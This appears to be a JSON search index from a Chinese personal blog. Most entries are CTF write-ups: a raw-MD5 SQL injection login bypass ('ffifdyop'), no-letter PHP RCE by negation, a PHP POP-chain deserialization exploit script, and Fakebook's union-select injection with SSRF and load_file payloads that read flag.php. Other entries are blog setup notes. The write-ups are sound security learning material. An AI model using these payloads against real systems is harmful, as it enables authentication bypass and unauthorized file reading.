[{"title":"[BJDCTF 2020]easy_md5","url":"/2025/02/13/BJDCTF-2020-easy-md5-1/","content":"解题过程dir扫扫没头绪别管了看下wp\n\n原来我们的小提示在输入框的返回响应头里\nselect * from &#x27;admin&#x27; where password=md5($pass,true)\n\n从名为 &#39;admin&#39; 的表中，选择所有列（*），但条件是密码字段的值必须等于一个通过 md5 函数加密后生成的密码。\n然后呢？密码呢？注入看看，好像不会，看看wp\nhttps://www.nssctf.cn/note/set/3001\n当‘ or ’ 后面的值为True是，就能构成万能密码，实现绕过\nselect * from `admin` where password=&#x27;&#x27;or&#x27;true&#x27;\n\n补充知识点：MySQL的一个特性：\n在mysql里面，在用作布尔型判断时，以1开头的字符串会被当做整型数。\n要注意的是这种情况是必须要有单引号括起来的，比如password&#x3D;‘xxx’ or ‘1xxxxxxxxx’，那么就相当于password&#x3D;‘xxx’ or 1 ，也就相当于password&#x3D;‘xxx’ or true，所以返回值就是true。\n当然在我后来测试中发现，不只是1开头，只要是数字开头都是可以的。当然如果只有数字的话，就不需要单引号，比如password&#x3D;‘xxx’ or 1，那么返回值也是true。（xxx指代任意字符）\nselect * from `admin` where password=&#x27;&#x27;or&#x27;1abcdefg&#x27;    ---&gt;  Trueselect * from `admin` where password=&#x27;&#x27;or&#x27;0abcdefg&#x27;    ---&gt;  Falseselect * from `admin` where password=&#x27;&#x27;or&#x27;1&#x27;           ---&gt;  Trueselect * from `admin` where password=&#x27;&#x27;or&#x27;2&#x27;           ---&gt;  Trueselect * from `admin` where password=&#x27;&#x27;or&#x27;0&#x27;           ---&gt;  False\n\n&lt;?php for ($i = 0;;) &#123;  for ($c = 0; $c &lt; 1000000; $c++, $i++)  if (stripos(md5($i, true), &#x27;\\&#x27;or\\&#x27;&#x27;) !== false)   echo &quot;\\nmd5($i) = &quot; . md5($i, true) . &quot;\\n&quot;; echo &quot;.&quot;;&#125;?&gt;//引用于 http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/\n\n*其实我看不懂下面一段这里提供一个最常用的：ffifdyop，该字符串md5加密后若md5()的参数为True时会返回 ‘or’6 (其实就是一些乱码和不可见字符，这里只要第一位是非零数字即可被判定为True，后面的会在MySQL将其转换成整型比较时丢掉)\n所以如果这里我们输入ffifdyop，后端的SQL语句会变成：\nselect * from `admin` where password=&#x27;&#x27;or&#x27;6&lt;trash&gt;&#x27;           ---&gt;  True\n\n这个过滤我会过过过\n\n方法 1：利用已知的 MD5 碰撞方法 2：利用 PHP 的类型特性（如果条件允许）数组绕过\nparam1[]=1&amp;param2[]=2\n\n在这种情况下：\n\nparam1 和 param2 都是数组，它们的值不同（[1] !== [2]）。\nmd5(param1) 和 md5(param2) 都返回 null，因此 null === null 为 true。\n\nBP一直抓的是上一次的包所以没成功太尴尬了\n知识点总结：PHPmd5绕过两个等号 0e绕过（记录特殊值三个等号 数组绕过tags:\n\nmd5\n弱比较\n强比较\n数组绕过\nPHP\n\n","categories":["Web"],"tags":["md5","弱比较","强比较","数组绕过","PHP"]},{"title":"[SWPUCTF 2021 新生赛]hardrce","url":"/2025/02/14/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-hardrce/","content":"此题属于我之前写了一半看了wp望而却步的一部分\n贴个源代码\n&lt;?phpheader(&quot;Content-Type:text/html;charset=utf-8&quot;);error_reporting(0);highlight_file(__FILE__);if(isset($_GET[&#x27;wllm&#x27;]))&#123;    $wllm = $_GET[&#x27;wllm&#x27;];    $blacklist = [&#x27; &#x27;,&#x27;\\t&#x27;,&#x27;\\r&#x27;,&#x27;\\n&#x27;,&#x27;\\+&#x27;,&#x27;\\[&#x27;,&#x27;\\^&#x27;,&#x27;\\]&#x27;,&#x27;\\&quot;&#x27;,&#x27;\\-&#x27;,&#x27;\\$&#x27;,&#x27;\\*&#x27;,&#x27;\\?&#x27;,&#x27;\\&lt;&#x27;,&#x27;\\&gt;&#x27;,&#x27;\\=&#x27;,&#x27;\\`&#x27;,];    foreach ($blacklist as $blackitem)    &#123;        if (preg_match(&#x27;/&#x27; . $blackitem . &#x27;/m&#x27;, $wllm)) &#123;        die(&quot;LTLT说不能用这些奇奇怪怪的符号哦！&quot;);    &#125;&#125;if(preg_match(&#x27;/[a-zA-Z]/is&#x27;,$wllm))&#123;    die(&quot;Ra&#x27;s Al Ghul说不能用字母哦！&quot;);&#125;echo &quot;NoVic4说：不错哦小伙子，可你能拿到flag吗？&quot;;eval($wllm);&#125;else&#123;    echo &quot;蔡总说：注意审题！！！&quot;;&#125;?&gt;\n\n\n可以看出，要绕过⿊名单和正则表达式。 不能异或，不能有字⺟数字。\n\n因为if(preg_match(‘&#x2F;[a-zA-Z]&#x2F;is’,$wllm))把所有字母都禁了，所以只能取反绕过\n取反绕过的原理：\n\n我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过。\n即，对查询语句取反，然后编码。在编码前加上~进行取反，括号没有被过滤，不用取反。\n\n发现一篇很有价值的文章：Web安全 | 无字母数字Webshell 总结\n","categories":["Web"],"tags":["无字母RCE","RCE","WAF绕过"]},{"title":"VNCTF 面试问题汇总答案","url":"/2025/02/16/VNCTF-%E9%9D%A2%E8%AF%95%E9%97%AE%E9%A2%98%E6%B1%87%E6%80%BB%E7%AD%94%E6%A1%88/","content":"\n      \n        \n      \n      \n        \n          \n          \n            Hey, password is required here.\n          \n        \n        \n      \n    \n    "},{"title":"[HNCTF 2022 WEEK4]pop子和pipi美","url":"/2025/02/15/HNCTF-2022-WEEK4-pop%E5%AD%90%E5%92%8Cpipi%E7%BE%8E/","content":"\n\n我会老实交代我是看wp知道传入参数的\n&lt;?phperror_reporting(0);//flag is in f14g.phpclass Popuko &#123;    private $No_893;    public function POP_TEAM_EPIC()&#123;        $WEBSITE  = &quot;MANGA LIFE WIN&quot;;    &#125;    public function __invoke()&#123;        $this-&gt;append($this-&gt;No_893);                   #2    &#125;    public function append($anti_takeshobo)&#123;        include($anti_takeshobo);                       #1 这里是pop链最后一步 要include f14g.php,了    &#125;&#125;class Pipimi&#123;        public $pipi;    public function PIPIPMI()&#123;        $h = &quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;;    &#125;    public function __construct()&#123;        echo &quot;Pipi美永远不会生气ww&quot;;        $this-&gt;pipi = array();    &#125;    public function __get($corepop)&#123;        $function = $this-&gt;p;        return $function();                              #3    &#125;&#125;class Goodsisters&#123;    public function PopukoPipimi()&#123;        $is = &quot;Good sisters&quot;;    &#125;    public $kiminonawa,$str;    public function __construct($file=&#x27;index.php&#x27;)&#123;        $this-&gt;kiminonawa = $file;        echo &#x27;Welcome to HNCTF2022 ,&#x27;;        echo &#x27;This is &#x27;.$this-&gt;kiminonawa.&quot;&lt;br&gt;&quot;;    &#125;    public function __toString()&#123;        return $this-&gt;str-&gt;kiminonawa;                   #4    &#125;    public function __wakeup()&#123;        if(preg_match(&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\\.\\./i&quot;, $this-&gt;kiminonawa)) &#123;            echo &quot;仲良ピース!&quot;;            $this-&gt;kiminonawa = &quot;index.php&quot;;             #5        &#125;    &#125;&#125;if(isset($_GET[&#x27;pop&#x27;])) @unserialize($_GET[&#x27;pop&#x27;]);  else&#123;    $a=new Goodsisters;    if(isset($_GET[&#x27;pop_EP&#x27;]) &amp;&amp; $_GET[&#x27;pop_EP&#x27;] == &quot;ep683045&quot;)&#123;        highlight_file(__FILE__);        echo &#x27;欸嘿,你也喜欢pop子~对吧ww&#x27;;    &#125;&#125;\n\n\n\nexp1:\n&lt;?php//flag is in f14g.phpclass Popuko &#123;    private $No_893=&quot;php://filter/read=convert.base64-encode/resource=f14g.php&quot;;    public function POP_TEAM_EPIC() &#123;        $WEBSITE = &quot;MANGA LIFE WIN&quot;;    &#125;    public function __invoke() &#123;        $this-&gt;append($this-&gt;No_893);                   #2    &#125;    public function append($anti_takeshobo) &#123;        include($anti_takeshobo);                       #1    &#125;&#125;class Pipimi &#123;    public $pipi;    public function PIPIPMI() &#123;        $h = &quot;超喜欢POP子ww,你也一样对吧(举刀)&quot;;    &#125;    public function __construct() &#123;        echo &quot;Pipi美永远不会生气ww&quot;;        #$this-&gt;pipi = array();        $this-&gt;p=new Popuko();    &#125;&#125;class Goodsisters &#123;    public $kiminonawa, $str;    public function __construct($file = &#x27;index.php&#x27;) &#123;        $this-&gt;str = new Pipimi();    &#125;    public function __toString() &#123;        return $this-&gt;str-&gt;kiminonawa;                   #4    &#125;    public function __wakeup() &#123;        if (preg_match(&quot;/popzi|flag|cha|https|http|file|dict|ftp|pipimei|gopher|\\.\\./i&quot;, $this-&gt;kiminonawa)) &#123;            echo &quot;仲良ピース!&quot;;            $this-&gt;kiminonawa = &quot;index.php&quot;;             #5        &#125;    &#125;&#125;$a = new Goodsisters();$a-&gt;kiminonawa = new Goodsisters();echo urlencode(serialize($a));\n\n","categories":["Web"],"tags":["PHP","反序列化","POP链"]},{"title":"misc的各种编码","url":"/2025/02/11/misc%E7%9A%84%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81/","content":"emoji编码在线网站解密https://aghorler.github.io/emoji-aes/\nkey一般在文件名中或其他地方\ne.g.[SWPUCTF 2023 秋季新生赛]谁发的图片打不开啊\n佛BK编码","categories":["Misc"],"tags":["笔记"]},{"title":"my first blog","url":"/2025/02/11/my-first-blog/","content":"一级标题代码测试： \nprint(&quot;Hello&quot;)\n\n\n\n图片测试： \n\n引用测试：\n\n这是一条引用 \n\n二级标题无序列表测试：\n\n哈哈 \n\n嘿嘿 \n吼吼\n\n\n\n三级标题四级标题home_cover:![头像](my-first-blog&#x2F;头像.jpg\ncategories:”index”\ntags:teststicky:2\n","categories":["Index"],"tags":["Test","First"]},{"title":"[ZJCTF 2019]NiZhuanSiWei","url":"/2025/02/13/ZJCTF-2019-NiZhuanSiWei/","content":"","categories":["Web"],"tags":["PHP","反序列化","PHP伪协议"]},{"title":"Hello World","url":"/2025/02/11/hello-world/","content":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.\nQuick StartCreate a new post$ hexo new &quot;My New Post&quot;\n\nMore info: Writing\nRun server$ hexo server\n\nMore info: Server\nGenerate static files$ hexo generate\n\nMore info: Generating\nDeploy to remote sites$ hexo deploy\n\nMore info: Deployment\n\n  alert(\"Hello World\"); \n\n# 安全设置encrypt:# 启用插件enable: false# 自定义加密相关设置abstract: “这里的内容加密了，需要密码哦。”message: “请输入密码查看本文。”# 可以在这里设定特定标签对应的默认密码tags:- [name: “encryptAsSecret”, password: “yoursecret”]# 错误消息设置wrong_pass_message: “密码错误，请重试。”wrong_hash_message: “内容认证失败，但仍可尝试查看。”# 是否禁用日志记录silent: false","categories":["Index"],"tags":["First"]},{"title":"汉堡师傅计网方面灵魂拷问","url":"/2025/02/11/%E6%B1%89%E5%A0%A1%E5%B8%88%E5%82%85%E8%AE%A1%E7%BD%91%E6%96%B9%E9%9D%A2%E7%81%B5%E9%AD%82%E6%8B%B7%E9%97%AE/","content":"\n      \n        \n      \n      \n        \n          \n          \n            Hey, password is required here.\n          \n        \n        \n      \n    \n    ","categories":["计网"],"tags":["笔记"]},{"title":"博客建设记录","url":"/2025/02/14/%E5%8D%9A%E5%AE%A2%E5%BB%BA%E8%AE%BE%E8%AE%B0%E5%BD%95/","content":"主题：arknights\n评论系统：valine（能看得到评论界面无法评论）\n加密：测试后发现输入密码后有回显但是无法看到文章\n看板娘；神秘出现\n我就输入了npm install hexo-helper-live2d –save 这一条命令就行了吗？？？\n","categories":["Index"]},{"title":"签到合集","url":"/2025/02/14/%E7%AD%BE%E5%88%B0%E5%90%88%E9%9B%86/","content":"[陇剑杯 2021]签到\n此时正在进行的可能是__________协议的网络攻击。（如有字母请全部使用小写，填写样例：http、dns、ftp）。\n\n打开pcap包\n点击“统计–协议分级”\n大部分使用的是TCP 和 HTTP（应用层）协议\n因此为http协议的网络攻击\n\n![QQ20250214-125\n"},{"title":"[蓝帽杯 2022 初赛]网站取证_2","url":"/2025/02/14/%E8%93%9D%E5%B8%BD%E6%9D%AF-2022-%E5%88%9D%E8%B5%9B-%E7%BD%91%E7%AB%99%E5%8F%96%E8%AF%81-2/","content":"省流版打开”…....\\网站取证\\WWW\\application\\database.php”，把PHP版本调成7.2以下，在最后添上\necho my_encrypt();\n\n运行，结束\n为什么可以这样做？点击license.txt文件，发现是thinkphp框架\n数据库文件是application&#x2F;database.php,跳转到数据库文件，发现该文件是加密的\n利用代码追踪功能，追踪加密函数\n","categories":["取证"],"tags":["电子取证","网站取证"]},{"title":"[网鼎杯 2018]Fakebook","url":"/2025/02/12/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook/","content":"解题过程\n\n访问robots.txt得到user.php.bak\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;&quot;;    public function __construct($name, $age, $blog)    &#123;        $this-&gt;name = $name;        $this-&gt;age = (int)$age;        $this-&gt;blog = $blog;    &#125;    function get($url)    &#123;        $ch = curl_init(); #存在ssrf，可以使用file://协议读取文件内容        curl_setopt($ch, CURLOPT_URL, $url);        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);        $output = curl_exec($ch);        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);        if($httpCode == 404) &#123;            return 404;        &#125;        curl_close($ch);        return $output;    &#125;    public function getBlogContents ()    &#123;        return $this-&gt;get($this-&gt;blog);    &#125;    public function isValidBlog ()    &#123;        $blog = $this-&gt;blog;        return preg_match(&quot;/^(((http(s?))\\:\\/\\/)?)([0-9a-zA-Z\\-]+\\.)+[a-zA-Z]&#123;2,6&#125;(\\:[0-9]+)?(\\/\\S*)?$/i&quot;, $blog);    &#125;&#125;\n\n这里做不出来，偷偷看了一点wp，原来注册以后点用户名url会有注入点\n\n预期解法我说为什么2’ –+不对 因为这是数字型注入…\n\n字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。\n\n1’ 报错\n1 and 1&#x3D;1 正常\n1 and 1&#x3D;2 正常查询，但是跟上面不一样\norder by 查到5报错，说明有4列\n一输入union select 就提示“no hack”被过滤了\n别管了看一下wp\nunion/**/select绕过\n\n怎么报错了，你们这个wp是怎么写的啊我要告你们\n\n因为这里3.4报错了，1不知道在哪里，只能看见2，所以2是回显位，接下来的注入语句都会安排在2这个位置\n为什么、原理之类的…不知道\n*不知道的地方总之就是知道回显位了可以继续用group_concat了\n\n所以只有一张表users\n\n一定要警戒table_name后面跟的表名要加**’’**\n\n我已经忘记关键字要加反引号了&#96;&#96;\n（以下都是搬运wp的，看得懂）\n猜测flag为flag.php\n同时 curl存在ssrf，可以使用file:&#x2F;&#x2F;协议读取文件内容\n&lt;?phpclass UserInfo&#123;    public $name = &quot;&quot;;    public $age = 0;    public $blog = &quot;file:///var/www/html/flag.php&quot;;&#125;echo serialize(new UserInfo());\n\n\n\n得到\nO:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;\n\n\n\n因为他是先查后反序列化（因为上面有报错）所以我们同样使用联合查询，将序列化内容放到相应的字段，就可以得到flag.php的内容\npayload:\n/view.php?no=-1 union/**/select 1,2,3,&#x27;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:0:&quot;&quot;;s:3:&quot;age&quot;;i:0;s:4:&quot;blog&quot;;s:29:&quot;file:///var/www/html/flag.php&quot;;&#125;&#x27;\n\n为什么只在源码里面？\n非预期解法\n\n查看数据库相关信息，发现为root权限\nroot权限在已知绝对路径的情况下，可以使用load_file()函数直接读取文件内容。已知flag.php文件的绝对路径为&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.phpload_file()函数可以利用绝对路径去加载一个文件\npayload:\n/view.php?no=-1 union/**/select 1,load_file(&quot;/var/www/html/flag.php&quot;),3,4\n\n因为是php文件，所以需要查看源码才能看见flag\n知识点总结sql注入读文件load_file 在root权限下\nunion select 绕过&#x2F;**&#x2F;\n参考文章感觉information_schema的命令不好记忆，看了这个形象一点\nhttps://blog.csdn.net/weixin_38972910/article/details/86012110\n","categories":["Web"],"tags":["反序列化","PHP伪协议","SQL注入"]},{"title":"[安洵杯 2019]CSS Game","url":"/2025/02/14/%E5%AE%89%E6%B4%B5%E6%9D%AF-2019-CSS-Game/","content":"题目看不懂 答案看不懂 原理也看不懂 复现也看不懂\n","categories":["Web"],"tags":["CSS注入","不懂"]}]